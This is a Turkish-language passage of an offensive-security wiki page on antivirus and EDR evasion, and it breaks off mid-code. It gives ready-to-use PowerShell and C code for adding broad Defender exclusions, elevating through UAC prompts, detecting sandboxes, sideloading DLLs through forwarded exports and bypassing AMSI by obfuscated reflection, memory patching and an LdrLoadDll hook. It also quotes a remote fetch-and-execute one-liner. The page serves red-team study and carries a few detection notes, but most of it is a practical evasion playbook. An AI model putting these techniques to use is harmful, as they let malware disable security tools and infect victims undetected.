# Antivirüs (AV) Atlatma

{{#include ../banners/hacktricks-training.md}}

**Bu sayfa ilk olarak** [**@m2rc_p**](https://twitter.com/m2rc_p)** tarafından yazılmıştır!**

## Defender'ı Durdurma

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender'ın çalışmasını durduran bir araç.
- [no-defender](https://github.com/es3n1n/no-defender): Başka bir AV'yi taklit ederek Windows Defender'ın çalışmasını durduran bir araç.
- [Yöneticiyseniz Defender'ı devre dışı bırakın](basic-powershell-for-pentesters/README.md)

### Defender'a müdahale etmeden önce yükleyici tarzı UAC tuzağı

Oyun hileleri gibi görünen herkese açık loader'lar genellikle imzasız Node.js/Nexe yükleyicileri olarak dağıtılır ve önce **kullanıcıdan yükseltme izni ister**, ardından Defender'ı etkisiz hale getirir. Akış basittir:

1. `net session` ile yönetici bağlamını kontrol edin. Komut yalnızca çağıran kullanıcı yönetici haklarına sahipse başarılı olur; dolayısıyla başarısız olması, loader'ın standart kullanıcı olarak çalıştığını gösterir.
2. Orijinal komut satırını korurken beklenen UAC izin istemini tetiklemek için `RunAs` fiiliyle hemen kendini yeniden başlatın.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Kurbanlar zaten “cracked” yazılım yüklediklerine inandığından, istem genellikle kabul edilir ve böylece malware, Defender’ın politikasını değiştirmek için ihtiyaç duyduğu izinleri alır.<sup>[[26]](#references)</sup>

### Her sürücü harfi için genel `MpPreference` dışlamaları

Yetki yükseltildikten sonra GachiLoader tarzı zincirler, hizmeti tamamen devre dışı bırakmak yerine Defender’ın kör noktalarını en üst düzeye çıkarır. Loader önce GUI watchdog’unu sonlandırır (`taskkill /F /IM SecHealthUI.exe`), ardından her kullanıcı profilini, sistem dizinini ve çıkarılabilir diski taranamaz hâle getirecek **son derece geniş kapsamlı dışlamalar** ekler:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Önemli gözlemler:

- Döngü, bağlı tüm dosya sistemlerini (D:\, E:\, USB bellekler vb.) tarar; bu nedenle diskin herhangi bir yerine bırakılan **gelecekteki payload'lar yok sayılır**.
- `.sys` uzantısının hariç tutulması ileriye dönük bir önlemdir: saldırganlar, Defender'a tekrar dokunmadan daha sonra imzasız sürücüler yükleme seçeneğini saklı tutar.
- Tüm değişiklikler `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` altında yapılır; böylece sonraki aşamalar, UAC'yi yeniden tetiklemeden hariç tutmaların kalıcı olduğunu doğrulayabilir veya bunları genişletebilir.

Hiçbir Defender hizmeti durdurulmadığından, basit sağlık kontrolleri gerçek zamanlı inceleme bu yolları hiç denetlemese bile “antivirüs etkin” raporlamaya devam eder.<sup>[[26]](#references)</sup>

## **AV Evasion Metodolojisi**

Günümüzde AV'ler, bir dosyanın kötü amaçlı olup olmadığını kontrol etmek için farklı yöntemler kullanır: statik tespit, dinamik analiz ve daha gelişmiş EDR'lerde davranışsal analiz.

### **Statik tespit**

Statik tespit; bir ikili dosya veya betikte bilinen kötü amaçlı dizeleri ya da bayt dizilerini işaretleyerek ve ayrıca dosyanın kendisinden bilgi (ör. dosya açıklaması, şirket adı, dijital imzalar, simge, sağlama toplamı vb.) çıkararak gerçekleştirilir. Bu nedenle bilinen genel araçları kullanmak daha kolay yakalanmanıza yol açabilir; muhtemelen analiz edilmiş ve kötü amaçlı olarak işaretlenmişlerdir. Bu tür bir tespitten kaçınmanın birkaç yolu vardır:

- **Şifreleme**

İkili dosyayı şifrelerseniz AV'nin programınızı tespit etmesi mümkün olmaz; ancak programın şifresini çözüp bellekte çalıştıracak bir tür loader gerekir.

- **Obfuscation**

Bazen ikili dosyanızdaki veya betiğinizdeki bazı dizeleri değiştirmek, onu AV tespitinden geçirmek için yeterlidir; ancak neyi obfuscate etmeye çalıştığınıza bağlı olarak bu zaman alabilir.

- **Özel araçlar**

Kendi araçlarınızı geliştirirseniz bilinen kötü amaçlı imzalar bulunmaz; ancak bu çok zaman ve emek gerektirir.

> [!TIP]
> Windows Defender'ın statik tespitini kontrol etmenin iyi bir yolu [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) kullanmaktır. Araç, dosyayı birden fazla parçaya böler ve Defender'dan her parçayı ayrı ayrı taramasını ister; böylece ikili dosyanızda hangi dizelerin veya baytların işaretlendiğini tam olarak gösterebilir.

Pratik AV Evasion hakkındaki bu [YouTube oynatma listesini](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) incelemenizi şiddetle öneririm.

### Statik sınıflandırıcılar için çevrimdışı PE özellik testleri

Paketlenmiş veya şifrelenmiş payload baytları, statik sınıflandırıcının kullandığı girdilerden yalnızca biridir. EMBER2024; import'lar, export'lar, bölümler, başlıklar ve Authenticode verileri dahil PE özelliklerini çıkarır.<sup>[[48]](#references)</sup> Bir loader deneyinde, zararsız görünen 141 import eklemek EMBER2024'ün kötü amaçlılık puanını %93 düşürürken, kötü amaçlı yazılımlarla ilişkilendirilen import'lar puanı yükseltti. Bu sonuç, belirli bir model ve örnekler için geçerlidir; belirli bir AV/EDR ürününü atlatmanın güvenilir bir yolu değildir.<sup>[[50]](#references)</sup>

Yetkili bir loader testi için payload'ı ve yürütme yolunu sabit tutun, her varyantta amaçlanan tek bir derleme değişkenini değiştirin ve puanları çevrimdışı karşılaştırın. Derleme değişikliği birden fazla özellik grubunu etkileyebileceğinden ortaya çıkan PE özelliklerini inceleyin.<sup>[[49]](#references)[[50]](#references)</sup> Amaçlanan import'ları IAT'de tutmak için seçilen Win32 API'lerini erişilebilir koddan çağırın. Seçimi değiştirin ve sabit bir kamuflaj işlevi oluşturmak yerine çağrı noktalarını farklı derlemelere dağıtın; sabit işlev bir imzaya dönüşebilir. Deneyde ayrıca geçerli kod imzalama, export girdileri ve `.pdata` bölümünü genişleten daha fazla işlev kullanıldığında puanların düştüğü bildirildi; geçersiz imzalamanın etkisi çok azdı ve `.pdata` etkisi küçüktü.<sup>[[50]](#references)</sup>

`thrember` paketi özellik çıkarımı ve kıyaslama modelleri sağlar. Paketi yükledikten sonra, mevcut bir `models` diziniyle `thrember.download_models("models")` komutunu kullanın ve ardından puanlayıcıyı üst dizininden çalıştırın: indirme yardımcı aracı geçerli çalışma dizinini değiştirir. PE sınıflandırıcısı, derlemelerin yer aldığı bir dizini tarama hizmetine göndermeden puanlayabilir:<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

Karşılaştırma sırasında model ve feature-extractor sürümlerini sabit tutun. Daha düşük bir offline puan, yalnızca bu sınıflandırıcının değiştirilmiş binary'ye nasıl tepki verdiğini gösterir; davranış analizinden, emülasyondan veya bir tedarikçinin farklı modelinden kaçınıldığını kanıtlamaz.<sup>[[49]](#references)[[50]](#references)</sup> Sanallaştırılmış payload'larda [build başına polymorphism ve dış binary kamuflajı](virtualized-payload-execution.md#camouflaging-the-outer-go-executable) için ayrı yürütme modeline bakın.

### **Dinamik analiz**

Dinamik analiz, AV'nin binary'nizi bir sandbox'ta çalıştırıp kötü amaçlı etkinlikleri (ör. tarayıcınızın parolalarını çözmeye ve okumaya çalışmak, LSASS üzerinde minidump almak vb.) izlemesidir. Bu kısımda çalışmak biraz daha zor olabilir, ancak sandbox'lardan kaçınmak için yapabileceğiniz bazı şeyler şunlardır.

- **Çalıştırmadan önce bekleme** Nasıl uygulandığına bağlı olarak, AV'nin dinamik analizini atlatmanın harika bir yolu olabilir. AV'lerin, kullanıcının iş akışını kesintiye uğratmamak için dosyaları taramak adına çok az zamanı vardır; bu nedenle uzun süre bekletmek binary analizini sekteye uğratabilir. Sorun şu ki, birçok AV sandbox'ı, uygulama biçimine bağlı olarak beklemeyi atlayabilir.
- **Makinenin kaynaklarını kontrol etme** Sandbox'ların genellikle kullanabilecekleri kaynaklar çok kısıtlıdır (ör. < 2GB RAM); aksi hâlde kullanıcının makinesini yavaşlatabilirler. Burada yaratıcılığınızı da konuşturabilirsiniz; örneğin CPU sıcaklığını veya fan hızlarını kontrol edebilirsiniz. Sandbox'ta her şey uygulanmış olmayabilir.
- **Makineye özgü kontroller** "contoso.local" etki alanına katılmış bir iş istasyonuna sahip kullanıcıyı hedeflemek istiyorsanız, bilgisayarın etki alanının belirttiğiniz etki alanıyla eşleşip eşleşmediğini kontrol edebilirsiniz. Eşleşmiyorsa programınızdan çıkabilirsiniz.

Microsoft Defender'ın Sandbox bilgisayar adının HAL9TH olduğu ortaya çıktı. Bu nedenle, çalıştırılmadan önce malware'inizde bilgisayar adını kontrol edebilirsiniz. Ad HAL9TH ile eşleşiyorsa Defender'ın sandbox'ındasınız demektir; bu durumda programınızdan çıkabilirsiniz.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>kaynak: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandbox'lara karşı koymak için [@mgeeky](https://twitter.com/mariuszbit) tarafından verilen diğer çok iyi ipuçları

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev kanalı</p></figcaption></figure>

Bu yazıda daha önce söylediğimiz gibi, **public araçlar** eninde sonunda **tespit edilir**. Bu yüzden kendinize şunu sormalısınız:

Örneğin, LSASS dump'ı almak istiyorsanız, **gerçekten mimikatz kullanmanız gerekiyor mu**? Yoksa daha az bilinen ve LSASS dump'ı alan farklı bir proje kullanabilir misiniz?

Doğru yanıt muhtemelen ikincisidir. mimikatz'ı örnek alırsak, muhtemelen AV'ler ve EDR'ler tarafından en çok işaretlenen malware'lerden biridir. Projenin kendisi çok başarılı olsa da AV'leri atlatmak için onunla çalışmak tam bir kâbustur. Bu nedenle, gerçekleştirmeye çalıştığınız şey için alternatifler arayın.

> [!TIP]
> Payload'larınızı kaçınma amacıyla değiştirirken Defender'da **otomatik örnek gönderimini kapattığınızdan** emin olun ve uzun vadede kaçınma hedefiniz varsa lütfen, gerçekten, **VIRUSTOTAL'A YÜKLEMEYİN**. Payload'ınızın belirli bir AV tarafından tespit edilip edilmediğini kontrol etmek istiyorsanız, AV'yi bir VM'ye kurun, otomatik örnek gönderimini kapatmaya çalışın ve sonuçtan memnun kalana kadar orada test edin.

## EXEs vs DLLs

Mümkün olduğunda, kaçınma için her zaman **DLL kullanmaya öncelik verin**. Deneyimlerime göre DLL dosyaları genellikle **çok daha az tespit edilir** ve analiz edilir. Bu nedenle, bazı durumlarda tespit edilmekten kaçınmak için kullanabileceğiniz çok basit bir yöntemdir (tabii payload'ınızın DLL olarak çalışmasını sağlayacak bir yolu varsa).

Bu görselde de görebileceğimiz gibi, Havoc'tan bir DLL Payload antiscan.me'de 4/26 tespit oranına sahipken EXE payload'ın tespit oranı 7/26'dır.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me'de normal bir Havoc EXE payload ile normal bir Havoc DLL karşılaştırması</p></figcaption></figure>

Şimdi DLL dosyalarıyla çok daha gizli olmanızı sağlayacak bazı yöntemleri göstereceğiz.

## DLL Sideloading & Proxying

**DLL Sideloading**, hem kurban uygulamayı hem de kötü amaçlı payload'ları yan yana yerleştirerek loader'ın kullandığı DLL arama sırasından yararlanır.

[Siofra](https://github.com/Cybereason/siofra) ve aşağıdaki powershell script'i kullanarak DLL Sideloading'e açık programları tespit edebilirsiniz:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Bu komut, "C:\Program Files\\" içindeki DLL hijacking'e açık programların listesini ve yüklemeye çalıştıkları DLL dosyalarını gösterecek.

**DLL Hijackable/Sideloadable programları kendiniz keşfetmenizi** önemle tavsiye ederim. Doğru şekilde uygulandığında bu teknik oldukça gizlidir, ancak herkese açık olarak bilinen DLL Sideloadable programları kullanırsanız kolayca yakalanabilirsiniz.

Bir programın yüklemeyi beklediği adla kötü amaçlı bir DLL yerleştirmek, payload'unuzu çalıştırmaz; çünkü program, o DLL içinde bazı belirli işlevlerin bulunmasını bekler. Bu sorunu çözmek için **DLL Proxying/Forwarding** adı verilen başka bir teknik kullanacağız.

**DLL Proxying**, programın proxy (ve kötü amaçlı) DLL üzerinden yaptığı çağrıları orijinal DLL'e yönlendirir. Böylece programın işlevselliği korunurken payload'unuzun çalıştırılmasını da sağlayabilirsiniz.

[@flangvik](https://twitter.com/Flangvik/) tarafından geliştirilen [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) projesini kullanacağım.

İzlediğim adımlar şunlardı:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Son komut bize 2 dosya verecek: bir DLL kaynak kodu şablonu ve yeniden adlandırılmış orijinal DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Bunlar sonuçlar:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Hem [SGN](https://github.com/EgeBalci/sgn) ile encode edilmiş shellcode'umuzun hem de proxy DLL'imizin [antiscan.me](https://antiscan.me) üzerindeki Detection rate değeri 0/26! Buna başarılı diyebiliriz.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> DLL Sideloading hakkında daha fazla bilgi edinmek için [S3cur3Th1sSh1t'ın Twitch VOD'unu](https://www.twitch.tv/videos/1644171543) ve ele aldıklarımızı daha derinlemesine öğrenmek için [ippsec'in videosunu](https://www.youtube.com/watch?v=3eROsG_WNpE) **şiddetle** izlemenizi öneririm.

### Forwarded Exports'u Kötüye Kullanma (ForwardSideLoading)

Windows PE modülleri, aslında "forwarder" olan işlevleri dışa aktarabilir: export girdisi kodu işaret etmek yerine `TargetDll.TargetFunc` biçiminde bir ASCII dizesi içerir. Bir çağıran export'u çözümlerken Windows loader şunları yapar:

- Henüz yüklenmemişse `TargetDll` dosyasını yükler
- `TargetFunc` işlevini bu dosyadan çözümler

Anlaşılması gereken temel davranışlar:
- `TargetDll` bir KnownDLL ise korumalı KnownDLLs namespace'inden sağlanır (ör. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- `TargetDll` bir KnownDLL değilse, forward çözümlemesini yapan modülün dizinini de içeren normal DLL arama sırası kullanılır.

Bu, dolaylı bir sideloading tekniği sağlar: işlevi KnownDLL olmayan bir modül adına yönlendirilen, imzalı bir DLL bulun; ardından bu imzalı DLL'yi, yönlendirilen hedef modülle tamamen aynı adı taşıyan ve saldırganın kontrolündeki bir DLL ile aynı dizine koyun. Yönlendirilen export çağrıldığında loader yönlendirmeyi çözümler ve DLL'inizi aynı dizinden yükleyerek DllMain'inizi çalıştırır.<sup>[[13]](#references)</sup>

Windows 11'de gözlemlenen örnek:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` bir KnownDLL değildir, bu nedenle normal arama sırasına göre çözümlenir.

PoC (kopyala-yapıştır):
1) İmzalı sistem DLL'sini yazılabilir bir klasöre kopyalayın
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Aynı klasöre kötü amaçlı bir `NCRYPTPROV.dll` bırakın. Kod çalıştırmak için minimal bir DllMain yeterlidir; DllMain'i tetiklemek için yönlendirilen fonksiyonu uygulamanız gerekmez.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) İmzalı bir LOLBin ile forward işlemini tetikleyin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Gözlemlenen davranış:
- rundll32 (signed), side-by-side `keyiso.dll` dosyasını (signed) yükler
- `KeyIsoSetAuditingInterface` işlevini çözümlerken loader, yönlendirmeyi `NCRYPTPROV.SetAuditingInterface` öğesine kadar izler
- Ardından loader, `C:\test` konumundan `NCRYPTPROV.dll` dosyasını yükler ve `DllMain` işlevini çalıştırır
- `SetAuditingInterface` uygulanmamışsa, "missing API" hatası ancak `DllMain` zaten çalıştırıldıktan sonra alınır

Araştırma ipuçları:
- Hedef modülün KnownDLL olmadığı yönlendirilmiş export'lara odaklanın. KnownDLL'ler `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` altında listelenir.
- Yönlendirilmiş export'ları şu tür araçlarla listeleyebilirsiniz:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Adayları aramak için Windows 11 forwarder envanterine bakın: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Tespit/savunma fikirleri:
- LOLBins'in (örn. rundll32.exe) sistem dışı yollardan imzalı DLL'ler yüklemesini ve ardından aynı dizinden aynı temel ada sahip KnownDLLs olmayan DLL'leri yüklemesini izleyin
- Şu tür işlem/modül zincirleri için uyarı oluşturun: `rundll32.exe` → kullanıcı tarafından yazılabilir yollar altında sistem dışı `keyiso.dll` → `NCRYPTPROV.dll`
- Kod bütünlüğü ilkelerini (WDAC/AppLocker) uygulayın ve uygulama dizinlerinde yazma+çalıştırma iznini engelleyin

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Freeze'i shellcode'unuzu gizli bir şekilde yüklemek ve çalıştırmak için kullanabilirsiniz.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion yalnızca bir kedi-fare oyunudur; bugün işe yarayan bir yöntem yarın tespit edilebilir. Bu yüzden asla tek bir araca güvenmeyin ve mümkünse birden fazla evasion tekniğini zincirleme kullanın.

## Direct/Indirect Syscalls ve SSN Çözümleme (SysWhispers4)

EDR'ler genellikle `ntdll.dll` syscall stub'larına **user-mode inline hook'lar** yerleştirir. Bu hook'ları atlatmak için doğru **SSN**'yi (System Service Number) yükleyen ve hook'lanmış export giriş noktasını çalıştırmadan kernel mode'a geçiş yapan **direct** veya **indirect** syscall stub'ları oluşturabilirsiniz.<sup>[[32]](#references)</sup>

**Çağırma seçenekleri:**
- **Direct (embedded)**: Oluşturulan stub'a bir `syscall`/`sysenter`/`SVC #0` talimatı ekler (`ntdll` export'una uğramaz).
- **Indirect**: Kernel geçişinin `ntdll` kaynaklı görünmesi için `ntdll` içindeki mevcut bir `syscall` gadget'ına atlar (heuristic evasion için kullanışlıdır); **randomized indirect**, her çağrıda bir havuzdan gadget seçer.
- **Egg-hunt**: Diskte statik `0F 05` opcode dizisinin bulunmasını önler; bir syscall dizisini çalışma zamanında çözümler.

**Hook'lara dayanıklı SSN çözümleme stratejileri:**
- **FreshyCalls (VA sort)**: Stub baytlarını okumak yerine syscall stub'larını sanal adreslerine göre sıralayarak SSN'leri tahmin eder.
- **SyscallsFromDisk**: Temiz bir `\KnownDlls\ntdll.dll` eşler, `.text` bölümünden SSN'leri okur ve ardından eşlemeyi kaldırır (bellekteki tüm hook'ları atlatır).
- **RecycledGate**: VA sıralı SSN tahminini, stub temiz olduğunda opcode doğrulamasıyla birleştirir; hook varsa VA tahmin yöntemine geri döner.
- **HW Breakpoint**: `syscall` talimatına DR0 ayarlar ve hook'lanmış baytları ayrıştırmadan çalışma zamanında `EAX` içindeki SSN'yi yakalamak için bir VEH kullanır.

SysWhispers4 kullanım örneği:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI, "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" tehditlerini önlemek için oluşturuldu. Başlangıçta AV'ler yalnızca **diskteki dosyaları** tarayabiliyordu. Bu nedenle, payload'ları bir şekilde **doğrudan bellekte** çalıştırabilirseniz AV bunu önlemek için hiçbir şey yapamazdı; çünkü yeterli görünürlüğe sahip değildi.

AMSI özelliği Windows'un şu bileşenlerine entegre edilmiştir:

- User Account Control veya UAC (EXE, COM, MSI ya da ActiveX kurulumu için yükseltme)
- PowerShell (script'ler, etkileşimli kullanım ve dinamik kod değerlendirmesi)
- Windows Script Host (wscript.exe ve cscript.exe)
- JavaScript ve VBScript
- Office VBA makroları

Antivirüs çözümlerinin script içeriğini şifrelenmemiş ve gizlenmemiş biçimde sunarak script davranışını incelemesini sağlar.

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` komutunu çalıştırmak Windows Defender'da aşağıdaki uyarıyı oluşturur.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

`amsi:` önekini ve ardından script'in çalıştığı yürütülebilir dosyanın yolunu eklediğine dikkat edin. Bu örnekte dosya powershell.exe'dir.

Diske hiçbir dosya bırakmadık, ancak AMSI nedeniyle yine de bellekteyken yakalandık.

Ayrıca **.NET 4.8** ile birlikte C# kodu da AMSI üzerinden çalıştırılır. Bu, bellekte çalıştırma için `Assembly.Load(byte[])` kullanmayı bile etkiler. Bu nedenle, AMSI'den kaçınmak için bellekte çalıştırma yaparken daha eski .NET sürümlerini (4.7.2 veya altı gibi) kullanmanız önerilir.

AMSI'yi aşmanın birkaç yolu vardır:

- **Obfuscation**

AMSI çoğunlukla statik tespit yöntemlerini kullandığından, yüklemeye çalıştığınız script'leri değiştirmek tespitten kaçınmak için iyi bir yöntem olabilir.

Ancak AMSI, birden fazla katman olsa bile script'lerdeki obfuscation'ı kaldırabilir. Bu nedenle, nasıl uygulandığına bağlı olarak obfuscation kötü bir seçenek olabilir. Bu da tespitten kaçınmayı pek kolaylaştırmaz. Yine de bazen birkaç değişken adını değiştirmeniz yeterli olur; dolayısıyla bu, bir şeyin ne ölçüde işaretlendiğine bağlıdır.

- **AMSI Bypass**

AMSI, powershell (ayrıca cscript.exe, wscript.exe vb.) sürecine bir DLL yüklenerek uygulandığından, ayrıcalıksız bir kullanıcı olarak çalışırken bile bu DLL'e kolayca müdahale etmek mümkündür. AMSI'nin uygulamasındaki bu kusur nedeniyle araştırmacılar, AMSI taramasından kaçınmanın birden fazla yolunu buldu.

**Bir Hatayı Zorlamak**

AMSI başlatma işleminin başarısız olmasını zorlamak (`amsiInitFailed`), mevcut süreç için tarama başlatılmamasına neden olur. Bu yöntem ilk olarak [Matt Graeber](https://twitter.com/mattifestation) tarafından açıklandı ve Microsoft, daha yaygın kullanılmasını önlemek için bir imza geliştirdi.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

AMSI'yi mevcut PowerShell süreci için kullanılamaz hale getirmek, tek satırlık bir PowerShell kodu kadar kolaydı. Elbette bu satır AMSI tarafından tespit edildiğinden, bu tekniği kullanabilmek için bazı değişiklikler yapmak gerekiyor.

İşte bu [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)'ten aldığım değiştirilmiş bir AMSI bypass:

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Keep in mind, this will probably get flagged once this post is published, so you should not publish any code if your plan is to stay undetected.

**Memory Patching**

Bu teknik ilk olarak [@RastaMouse](https://twitter.com/_RastaMouse/) tarafından keşfedildi. Kullanıcı tarafından sağlanan girdiyi taramaktan sorumlu olan amsi.dll içindeki "AmsiScanBuffer" işlevinin adresini bulup, E_INVALIDARG kodunu döndürmesini sağlayan talimatlarla üzerine yazmayı içerir. Böylece gerçek taramanın sonucu 0 döner ve bu sonuç temiz olarak yorumlanır.

> [!TIP]
> Daha ayrıntılı bir açıklama için lütfen [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) adresini okuyun.

AMSI'yi powershell ile bypass etmek için kullanılan başka birçok teknik de var. Bunlar hakkında daha fazla bilgi edinmek için [**bu sayfaya**](basic-powershell-for-pentesters/index.html#amsi-bypass) ve [**bu repoya**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) göz atın.

### `AmsiScanBuffer` patching yerine AMSI COM tarama işaretçisini yönlendirme

İşlem içinde çalışan başka bir bypass, `AmsiScanBuffer` giriş noktasını değiştirmeden bırakır. Bildirilen 64-bit .NET loader'da, `fdb00e52-a214-4aa1-8fba-4357bb0072ec` CLSID'sinden bir AMSI COM nesnesi oluşturulur; `Marshal.GetIUnknownForObject()` arayüz işaretçisini döndürür ve `0x18` ofsetindeki vtable yuvası tarama çağrısının hedefi olarak kullanılır. Loader, `Console.Clear()` için bir native işaretçiye küçük bir x64 stub yazar, `VirtualProtect()` altında bu vtable girdisini stub'a yönlendirir, ardından sayfanın özgün koruma ayarını geri yükler. Hem 64-bit işaretçi genişliği hem de beklenen COM düzeni gereklidir; bu, gelişigüzel AMSI arayüzleri veya build'ler için geçerli genel bir ofset değildir. Daha önce gözlemlenen aşamalar, [imzalı AppDomainManager sidecar yüklemesi](windows-local-privilege-escalation/dll-hijacking/#signed-appdomainmanager-type-as-a-configuration-file-gadget) ve [RESX deserialization](../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml) aşamalarıdır.<sup>[[51]](#references)</sup>

Gözlemlenen stub baytları `41 C7 00 01 00 00 00 33 C0 C3` şeklindedir: `r8` içindeki sonuç işaretçisine **1** yazar ve `eax` içinde **0** döndürür. Bu nedenle, tarama sonucunun `AMSI_RESULT_CLEAN` (0) olduğu yönündeki bildirilen iddia, `S_OK` dönüş değerini çıktı enum değeriyle karıştırır. Belgelenmiş `AMSI_RESULT` sıralamasında **1**, `AMSI_RESULT_NOT_DETECTED` değeridir; yine de algılama eşiğinin altındadır.<sup>[[51]](#references)[[52]](#references)[[53]](#references)</sup>

### amsi.dll yüklenmesini engelleyerek AMSI'yi devre dışı bırakma (LdrLoadDll hook)

AMSI yalnızca `amsi.dll` geçerli sürece yüklendikten sonra başlatılır. Dilden bağımsız, sağlam bir bypass yöntemi, `ntdll!LdrLoadDll` üzerinde istenen modül `amsi.dll` olduğunda hata döndüren bir user-mode hook oluşturmaktır. Böylece AMSI hiç yüklenmez ve bu işlem için hiçbir tarama gerçekleşmez.<sup>[[23]](#references)</sup>

Uygulama taslağı (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
